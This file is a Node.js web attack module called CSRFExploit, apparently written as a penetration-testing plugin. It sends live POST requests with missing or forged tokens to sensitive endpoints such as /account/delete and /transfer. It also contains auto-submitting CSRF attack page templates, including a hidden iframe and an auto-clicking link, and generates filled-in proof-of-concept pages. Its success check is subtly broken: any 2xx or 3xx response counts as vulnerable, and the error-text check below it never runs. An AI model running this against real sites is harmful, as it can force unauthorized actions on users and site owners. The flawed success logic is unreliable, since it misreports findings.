const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');

class CSRFExploit {
    constructor() {
        this.displayName = 'CSRF Scanner';
        this.description = 'Cross-Site Request Forgery vulnerability detection and exploitation';
        this.severity = 'medium';
        this.category = 'web-application';
        this.version = '2.0.0';

        // Common CSRF token parameter names
        this.csrfTokenNames = [
            'csrf_token',
            'csrfToken',
            'csrf',
            '_token',
            'token',
            'authenticity_token',
            'auth_token',
            'security_token',
            'form_token',
            'nonce',
            '_nonce',
            'state',
            'random',
            'challenge',
            'verification',
            '_wpnonce',
            'csrfmiddlewaretoken',
            '__RequestVerificationToken',
            'cc_token',
            '_form_token',
            'hash',
            'signature'
        ];

        // HTTP methods that can modify state
        this.statefulMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];

        // Common form actions that are likely to be CSRF targets
        this.sensitiveActions = [
            'login',
            'logout',
            'register',
            'signup',
            'signin',
            'password',
            'change',
            'update',
            'delete',
            'remove',
            'transfer',
            'payment',
            'purchase',
            'order',
            'submit',
            'send',
            'create',
            'edit',
            'modify',
            'admin',
            'settings',
            'profile',
            'account',
            'user',
            'email',
            'contact'
        ];

        // Headers that might indicate CSRF protection
        this.csrfHeaders = [
            'x-csrf-token',
            'x-xsrf-token',
            'x-csrftoken',
            'x-requested-with',
            'x-anti-forgery-token',
            'x-form-token',
            'csrf-token',
            'anti-csrf-token'
        ];

        // Common CSRF attack patterns
        this.attackPatterns = {
            // Basic form submission
            basicForm: `
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <form action="{TARGET_URL}" method="{METHOD}" id="csrfForm">
        {FORM_FIELDS}
        <input type="submit" value="Submit">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>`,

            // Hidden iframe attack
            iframeAttack: `
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <iframe style="display:none" name="hiddenFrame"></iframe>
    <form action="{TARGET_URL}" method="{METHOD}" target="hiddenFrame" id="csrfForm">
        {FORM_FIELDS}
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>`,

            // AJAX CSRF attack
            ajaxAttack: `
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open('{METHOD}', '{TARGET_URL}', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('{FORM_DATA}');
    </script>
</body>
</html>`,

            // Image-based GET CSRF
            imageAttack: `
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <img src="{TARGET_URL}" style="display:none;">
</body>
</html>`,

            // Link-based attack
            linkAttack: `
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <a href="{TARGET_URL}" onclick="this.click();">Click here for a surprise!</a>
    <script>
        window.onload = function() {
            document.querySelector('a').click();
        };
    </script>
</body>
</html>`
        };
    }

    async execute(target, options = {}) {
        try {
            const startTime = Date.now();
            const results = {
                target,
                timestamp: new Date(),
                vulnerabilities: [],
                statistics: {
                    totalTests: 0,
                    formsAnalyzed: 0,
                    csrfVulnerable: 0,
                    protectedEndpoints: 0,
                    unprotectedEndpoints: 0
                },
                detailedResults: {}
            };

            console.log(`[CSRF] Starting CSRF scan on: ${target}`);

            // Step 1: Analyze the target page for forms and potential CSRF targets
            const pageAnalysis = await this.analyzePage(target, options);
            results.detailedResults.pageAnalysis = pageAnalysis;
            results.statistics.formsAnalyzed = pageAnalysis.forms.length;

            // Step 2: Test each form for CSRF protection
            for (const form of pageAnalysis.forms) {
                console.log(`[CSRF] Testing form: ${form.action}`);

                const formResults = await this.testFormCSRF(target, form, options);
                results.detailedResults[`form_${form.id || form.action}`] = formResults;
                results.statistics.totalTests += formResults.tests.length;
                results.vulnerabilities.push(...formResults.vulnerabilities);

                if (formResults.vulnerabilities.length > 0) {
                    results.statistics.csrfVulnerable++;
                } else {
                    results.statistics.protectedEndpoints++;
                }
            }

            // Step 3: Test common sensitive endpoints
            const endpointResults = await this.testCommonEndpoints(target, options);
            results.detailedResults.endpointTesting = endpointResults;
            results.statistics.totalTests += endpointResults.tests.length;
            results.vulnerabilities.push(...endpointResults.vulnerabilities);
            results.statistics.unprotectedEndpoints += endpointResults.vulnerabilities.length;

            // Step 4: Test CSRF token validation
            if (pageAnalysis.csrfTokens.length > 0) {
                const tokenResults = await this.testCSRFTokenValidation(target, pageAnalysis, options);
                results.detailedResults.tokenValidation = tokenResults;
                results.statistics.totalTests += tokenResults.tests.length;
                results.vulnerabilities.push(...tokenResults.vulnerabilities);
            }

            // Step 5: Test SameSite cookie protection
            const cookieResults = await this.testSameSiteCookies(target, options);
            results.detailedResults.cookieTesting = cookieResults;
            results.statistics.totalTests += cookieResults.tests.length;
            results.vulnerabilities.push(...cookieResults.vulnerabilities);

            results.executionTime = Date.now() - startTime;
            console.log(`[CSRF] Scan completed. Found ${results.vulnerabilities.length} vulnerabilities in ${results.executionTime}ms`);

            return results;

        } catch (error) {
            console.error('[CSRF] Scan failed:', error.message);
            throw error;
        }
    }

    async analyzePage(target, options) {
        const analysis = {
            forms: [],
            csrfTokens: [],
            sensitiveEndpoints: [],
            headers: {},
            cookies: []
        };

        try {
            const response = await this.makeRequest(target, 'GET', {}, options);

            // Store response headers
            analysis.headers = response.headers || {};

            // Parse cookies
            const cookies = response.headers['set-cookie'] || [];
            analysis.cookies = cookies.map(cookie => this.parseCookie(cookie));

            if (response.data && typeof response.data === 'string') {
                const $ = cheerio.load(response.data);

                // Find all forms
                $('form').each((index, element) => {
                    const form = this.parseForm($, element, target);
                    analysis.forms.push(form);

                    // Check for CSRF tokens in this form
                    form.fields.forEach(field => {
                        if (this.isCSRFToken(field.name)) {
                            analysis.csrfTokens.push({
                                name: field.name,
                                value: field.value,
                                formAction: form.action,
                                type: field.type
                            });
                        }
                    });
                });

                // Find links that might be sensitive endpoints
                $('a[href]').each((index, element) => {
                    const href = $(element).attr('href');
                    if (href && this.isSensitiveEndpoint(href)) {
                        analysis.sensitiveEndpoints.push({
                            url: this.resolveUrl(target, href),
                            text: $(element).text().trim(),
                            method: 'GET'
                        });
                    }
                });

                // Look for CSRF tokens in meta tags
                $('meta[name*="csrf"], meta[name*="token"]').each((index, element) => {
                    const name = $(element).attr('name');
                    const content = $(element).attr('content');
                    if (name && content) {
                        analysis.csrfTokens.push({
                            name,
                            value: content,
                            location: 'meta',
                            type: 'hidden'
                        });
                    }
                });

                // Check for CSRF protection headers
                this.csrfHeaders.forEach(headerName => {
                    if (analysis.headers[headerName] || analysis.headers[headerName.toLowerCase()]) {
                        analysis.csrfTokens.push({
                            name: headerName,
                            value: analysis.headers[headerName] || analysis.headers[headerName.toLowerCase()],
                            location: 'header',
                            type: 'header'
                        });
                    }
                });
            }

        } catch (error) {
            console.error('[CSRF] Page analysis failed:', error.message);
        }

        return analysis;
    }

    async testFormCSRF(baseUrl, form, options) {
        const results = {
            form: form.action,
            method: form.method,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[CSRF] Testing CSRF protection for form: ${form.action}`);

        // Test 1: Submit form without CSRF token
        const testWithoutToken = await this.testFormWithoutCSRFToken(baseUrl, form, options);
        results.tests.push(testWithoutToken);
        if (testWithoutToken.vulnerable) {
            results.vulnerabilities.push({
                type: 'Cross-Site Request Forgery (CSRF)',
                subtype: 'Missing CSRF Protection',
                severity: 'medium',
                target: form.action,
                method: form.method,
                evidence: testWithoutToken.evidence,
                impact: 'Attackers can perform unauthorized actions on behalf of authenticated users',
                recommendation: 'Implement CSRF tokens and validate them on all state-changing operations',
                cwe: 'CWE-352',
                owasp: 'A01:2021 – Broken Access Control',
                proofOfConcept: this.generateCSRFPoC(form)
            });
        }

        // Test 2: Submit form with invalid CSRF token
        if (form.hasCSRFToken) {
            const testWithInvalidToken = await this.testFormWithInvalidCSRFToken(baseUrl, form, options);
            results.tests.push(testWithInvalidToken);
            if (testWithInvalidToken.vulnerable) {
                results.vulnerabilities.push({
                    type: 'Cross-Site Request Forgery (CSRF)',
                    subtype: 'Weak CSRF Token Validation',
                    severity: 'medium',
                    target: form.action,
                    method: form.method,
                    evidence: testWithInvalidToken.evidence,
                    impact: 'CSRF protection can be bypassed with invalid tokens',
                    recommendation: 'Implement proper CSRF token validation and reject invalid tokens',
                    cwe: 'CWE-352',
                    owasp: 'A01:2021 – Broken Access Control'
                });
            }
        }

        // Test 3: Check if form can be submitted via GET (for POST forms)
        if (form.method.toUpperCase() === 'POST') {
            const testMethodOverride = await this.testMethodOverride(baseUrl, form, options);
            results.tests.push(testMethodOverride);
            if (testMethodOverride.vulnerable) {
                results.vulnerabilities.push({
                    type: 'Cross-Site Request Forgery (CSRF)',
                    subtype: 'HTTP Method Override',
                    severity: 'medium',
                    target: form.action,
                    evidence: testMethodOverride.evidence,
                    impact: 'POST forms can be submitted via GET requests, bypassing CSRF protection',
                    recommendation: 'Enforce proper HTTP method validation and reject GET requests for state-changing operations',
                    cwe: 'CWE-352',
                    owasp: 'A01:2021 – Broken Access Control'
                });
            }
        }

        return results;
    }

    async testFormWithoutCSRFToken(baseUrl, form, options) {
        try {
            // Create form data without CSRF tokens
            const formData = {};
            form.fields.forEach(field => {
                if (!this.isCSRFToken(field.name)) {
                    formData[field.name] = field.value || 'test_value';
                }
            });

            const response = await this.makeRequest(form.action, form.method, formData, options);

            return {
                test: 'submit_without_csrf_token',
                vulnerable: this.isRequestSuccessful(response),
                statusCode: response.status,
                evidence: `Request succeeded with status ${response.status}`,
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'submit_without_csrf_token',
                vulnerable: false,
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async testFormWithInvalidCSRFToken(baseUrl, form, options) {
        try {
            const formData = {};
            form.fields.forEach(field => {
                if (this.isCSRFToken(field.name)) {
                    formData[field.name] = 'invalid_token_' + crypto.randomBytes(16).toString('hex');
                } else {
                    formData[field.name] = field.value || 'test_value';
                }
            });

            const response = await this.makeRequest(form.action, form.method, formData, options);

            return {
                test: 'submit_with_invalid_csrf_token',
                vulnerable: this.isRequestSuccessful(response),
                statusCode: response.status,
                evidence: `Request with invalid token succeeded with status ${response.status}`,
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'submit_with_invalid_csrf_token',
                vulnerable: false,
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async testMethodOverride(baseUrl, form, options) {
        try {
            // Try to submit POST form data via GET request
            const queryParams = new URLSearchParams();
            form.fields.forEach(field => {
                if (!this.isCSRFToken(field.name)) {
                    queryParams.append(field.name, field.value || 'test_value');
                }
            });

            const getUrl = `${form.action}?${queryParams.toString()}`;
            const response = await this.makeRequest(getUrl, 'GET', {}, options);

            return {
                test: 'method_override_get',
                vulnerable: this.isRequestSuccessful(response),
                statusCode: response.status,
                evidence: `POST form accepted GET request with status ${response.status}`,
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'method_override_get',
                vulnerable: false,
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async testCommonEndpoints(target, options) {
        const results = {
            tests: [],
            vulnerabilities: []
        };

        const baseUrl = new URL(target);
        const commonEndpoints = [
            '/admin',
            '/admin/users',
            '/admin/delete',
            '/api/user/delete',
            '/api/user/update',
            '/api/password/change',
            '/user/settings',
            '/profile/update',
            '/account/delete',
            '/logout',
            '/transfer',
            '/payment',
            '/order/create'
        ];

        console.log(`[CSRF] Testing common sensitive endpoints`);

        for (const endpoint of commonEndpoints) {
            try {
                const targetUrl = `${baseUrl.protocol}//${baseUrl.host}${endpoint}`;

                // Test POST request without CSRF protection
                const postResponse = await this.makeRequest(targetUrl, 'POST', { test: 'csrf_test' }, options);

                const testResult = {
                    endpoint,
                    method: 'POST',
                    statusCode: postResponse.status,
                    vulnerable: this.isRequestSuccessful(postResponse),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.vulnerable) {
                    results.vulnerabilities.push({
                        type: 'Cross-Site Request Forgery (CSRF)',
                        subtype: 'Unprotected Endpoint',
                        severity: 'medium',
                        target: targetUrl,
                        method: 'POST',
                        evidence: `Endpoint accepts POST requests without CSRF protection (Status: ${postResponse.status})`,
                        impact: 'Sensitive endpoint vulnerable to CSRF attacks',
                        recommendation: 'Implement CSRF protection for all state-changing endpoints',
                        cwe: 'CWE-352',
                        owasp: 'A01:2021 – Broken Access Control'
                    });
                }

            } catch (error) {
                results.tests.push({
                    endpoint,
                    method: 'POST',
                    error: error.message,
                    timestamp: new Date()
                });
            }

            // Rate limiting
            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testCSRFTokenValidation(target, pageAnalysis, options) {
        const results = {
            tests: [],
            vulnerabilities: []
        };

        console.log(`[CSRF] Testing CSRF token validation mechanisms`);

        for (const token of pageAnalysis.csrfTokens) {
            // Test 1: Token reuse
            const reuseTest = await this.testTokenReuse(target, token, options);
            results.tests.push(reuseTest);
            if (reuseTest.vulnerable) {
                results.vulnerabilities.push({
                    type: 'Cross-Site Request Forgery (CSRF)',
                    subtype: 'Token Reuse Vulnerability',
                    severity: 'low',
                    target,
                    evidence: reuseTest.evidence,
                    impact: 'CSRF tokens can be reused multiple times',
                    recommendation: 'Implement one-time CSRF tokens that expire after use',
                    cwe: 'CWE-352',
                    owasp: 'A01:2021 – Broken Access Control'
                });
            }

            // Test 2: Token predictability
            const predictabilityTest = await this.testTokenPredictability(target, token, options);
            results.tests.push(predictabilityTest);
            if (predictabilityTest.vulnerable) {
                results.vulnerabilities.push({
                    type: 'Cross-Site Request Forgery (CSRF)',
                    subtype: 'Predictable CSRF Token',
                    severity: 'high',
                    target,
                    evidence: predictabilityTest.evidence,
                    impact: 'CSRF tokens are predictable and can be guessed by attackers',
                    recommendation: 'Use cryptographically secure random token generation',
                    cwe: 'CWE-352',
                    owasp: 'A02:2021 – Cryptographic Failures'
                });
            }
        }

        return results;
    }

    async testTokenReuse(target, token, options) {
        try {
            // Make two identical requests with the same token
            const formData = { [token.name]: token.value };

            const response1 = await this.makeRequest(target, 'POST', formData, options);
            const response2 = await this.makeRequest(target, 'POST', formData, options);

            const vulnerable = this.isRequestSuccessful(response1) && this.isRequestSuccessful(response2);

            return {
                test: 'token_reuse',
                vulnerable,
                evidence: `Both requests succeeded: ${response1.status}, ${response2.status}`,
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'token_reuse',
                vulnerable: false,
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async testTokenPredictability(target, token, options) {
        try {
            // Collect multiple tokens to analyze predictability
            const tokens = [];

            for (let i = 0; i < 5; i++) {
                const response = await this.makeRequest(target, 'GET', {}, options);
                if (response.data) {
                    const $ = cheerio.load(response.data);
                    const foundToken = $(`input[name="${token.name}"]`).attr('value') ||
                                     $(`meta[name="${token.name}"]`).attr('content');
                    if (foundToken) {
                        tokens.push(foundToken);
                    }
                }
                await this.sleep(100); // Small delay between requests
            }

            // Simple predictability check
            const vulnerable = this.analyzeTokenPredictability(tokens);

            return {
                test: 'token_predictability',
                vulnerable,
                evidence: `Analyzed ${tokens.length} tokens for predictability patterns`,
                tokens: tokens.slice(0, 3), // Include first 3 tokens as evidence
                timestamp: new Date()
            };

        } catch (error) {
            return {
                test: 'token_predictability',
                vulnerable: false,
                error: error.message,
                timestamp: new Date()
            };
        }
    }

    async testSameSiteCookies(target, options) {
        const results = {
            tests: [],
            vulnerabilities: []
        };

        try {
            const response = await this.makeRequest(target, 'GET', {}, options);
            const cookies = response.headers['set-cookie'] || [];

            for (const cookieHeader of cookies) {
                const cookie = this.parseCookie(cookieHeader);

                const testResult = {
                    cookie: cookie.name,
                    sameSite: cookie.sameSite,
                    secure: cookie.secure,
                    httpOnly: cookie.httpOnly,
                    vulnerable: !cookie.sameSite || cookie.sameSite.toLowerCase() === 'none',
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.vulnerable) {
                    results.vulnerabilities.push({
                        type: 'Cross-Site Request Forgery (CSRF)',
                        subtype: 'Missing SameSite Cookie Protection',
                        severity: 'low',
                        target,
                        evidence: `Cookie "${cookie.name}" lacks SameSite protection`,
                        impact: 'Cookies can be sent in cross-site requests',
                        recommendation: 'Set SameSite=Strict or SameSite=Lax on all cookies',
                        cwe: 'CWE-352',
                        owasp: 'A01:2021 – Broken Access Control'
                    });
                }
            }

        } catch (error) {
            results.tests.push({
                test: 'samesite_cookies',
                error: error.message,
                timestamp: new Date()
            });
        }

        return results;
    }

    parseForm($, element, baseUrl) {
        const form = {
            action: this.resolveUrl(baseUrl, $(element).attr('action') || ''),
            method: ($(element).attr('method') || 'GET').toUpperCase(),
            fields: [],
            hasCSRFToken: false
        };

        // Parse form fields
        $(element).find('input, select, textarea').each((index, field) => {
            const fieldData = {
                name: $(field).attr('name'),
                type: $(field).attr('type') || 'text',
                value: $(field).attr('value') || $(field).val(),
                required: $(field).prop('required')
            };

            if (fieldData.name) {
                form.fields.push(fieldData);

                if (this.isCSRFToken(fieldData.name)) {
                    form.hasCSRFToken = true;
                }
            }
        });

        return form;
    }

    isCSRFToken(fieldName) {
        if (!fieldName) return false;

        const lowerName = fieldName.toLowerCase();
        return this.csrfTokenNames.some(tokenName =>
            lowerName.includes(tokenName.toLowerCase())
        );
    }

    isSensitiveEndpoint(url) {
        const lowerUrl = url.toLowerCase();
        return this.sensitiveActions.some(action =>
            lowerUrl.includes(action)
        );
    }

    resolveUrl(baseUrl, relativeUrl) {
        try {
            return new URL(relativeUrl, baseUrl).toString();
        } catch (error) {
            return relativeUrl;
        }
    }

    parseCookie(cookieHeader) {
        const cookie = {
            name: '',
            value: '',
            sameSite: null,
            secure: false,
            httpOnly: false
        };

        const parts = cookieHeader.split(';');

        if (parts[0]) {
            const [name, value] = parts[0].split('=');
            cookie.name = name ? name.trim() : '';
            cookie.value = value ? value.trim() : '';
        }

        parts.forEach(part => {
            const trimmed = part.trim().toLowerCase();
            if (trimmed.startsWith('samesite=')) {
                cookie.sameSite = part.trim().split('=')[1];
            } else if (trimmed === 'secure') {
                cookie.secure = true;
            } else if (trimmed === 'httponly') {
                cookie.httpOnly = true;
            }
        });

        return cookie;
    }

    analyzeTokenPredictability(tokens) {
        if (tokens.length < 3) return false;

        // Check for sequential patterns
        const numericTokens = tokens.map(t => parseInt(t, 16) || parseInt(t, 10)).filter(n => !isNaN(n));
        if (numericTokens.length >= 3) {
            // Check if tokens are sequential
            for (let i = 1; i < numericTokens.length - 1; i++) {
                if (numericTokens[i] === numericTokens[i-1] + 1 &&
                    numericTokens[i+1] === numericTokens[i] + 1) {
                    return true;
                }
            }
        }

        // Check for timestamp-based tokens
        const timestamps = tokens.map(t => {
            const match = t.match(/(\d{10,13})/);
            return match ? parseInt(match[1]) : null;
        }).filter(t => t !== null);

        if (timestamps.length >= 2) {
            // Check if tokens contain recent timestamps
            const now = Date.now();
            const recentTimestamps = timestamps.filter(t =>
                Math.abs(now - t) < 86400000 || // Within 24 hours (seconds)
                Math.abs(now - t * 1000) < 86400000 // Within 24 hours (milliseconds)
            );
            if (recentTimestamps.length > 0) {
                return true;
            }
        }

        return false;
    }

    generateCSRFPoC(form) {
        let template = this.attackPatterns.basicForm;

        if (form.method.toUpperCase() === 'GET') {
            template = this.attackPatterns.linkAttack;
        }

        const formFields = form.fields
            .filter(field => !this.isCSRFToken(field.name))
            .map(field => `<input type="hidden" name="${field.name}" value="${field.value || 'malicious_value'}">`)
            .join('\n        ');

        const formData = form.fields
            .filter(field => !this.isCSRFToken(field.name))
            .map(field => `${encodeURIComponent(field.name)}=${encodeURIComponent(field.value || 'malicious_value')}`)
            .join('&');

        return template
            .replace('{TARGET_URL}', form.action)
            .replace('{METHOD}', form.method)
            .replace('{FORM_FIELDS}', formFields)
            .replace('{FORM_DATA}', formData);
    }

    async makeRequest(url, method = 'GET', data = {}, options = {}) {
        const requestOptions = {
            method: method.toUpperCase(),
            url,
            timeout: options.timeout || 30000,
            headers: {
                'User-Agent': options.userAgent || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                ...options.headers
            },
            validateStatus: () => true // Accept all status codes
        };

        if (method.toUpperCase() !== 'GET' && Object.keys(data).length > 0) {
            requestOptions.data = new URLSearchParams(data).toString();
            requestOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }

        return await axios(requestOptions);
    }

    isRequestSuccessful(response) {
        // Consider 2xx and 3xx status codes as successful
        // Also check for common success indicators in response
        if (response.status >= 200 && response.status < 400) {
            return true;
        }

        // Some applications return 200 but with error messages
        if (response.status === 200 && response.data) {
            const errorIndicators = [
                /error/i,
                /invalid/i,
                /unauthorized/i,
                /forbidden/i,
                /access denied/i,
                /csrf/i,
                /token/i
            ];

            const hasError = errorIndicators.some(pattern => pattern.test(response.data));
            return !hasError;
        }

        return false;
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getInfo() {
        return {
            name: this.displayName,
            description: this.description,
            version: this.version,
            severity: this.severity,
            category: this.category,
            techniques: [
                'CSRF Token Analysis',
                'Form Submission Testing',
                'Method Override Testing',
                'SameSite Cookie Analysis',
                'Token Predictability Testing',
                'Endpoint Protection Verification'
            ],
            parameters: [
                {
                    name: 'delay',
                    description: 'Delay between requests in milliseconds',
                    type: 'number',
                    default: 100
                },
                {
                    name: 'timeout',
                    description: 'Request timeout in milliseconds',
                    type: 'number',
                    default: 30000
                },
                {
                    name: 'userAgent',
                    description: 'Custom User-Agent header',
                    type: 'string',
                    default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            ],
            csrfTokenNames: this.csrfTokenNames.length,
            sensitiveActions: this.sensitiveActions.length,
            attackPatterns: Object.keys(this.attackPatterns).length
        };
    }
}

module.exports = CSRFExploit;
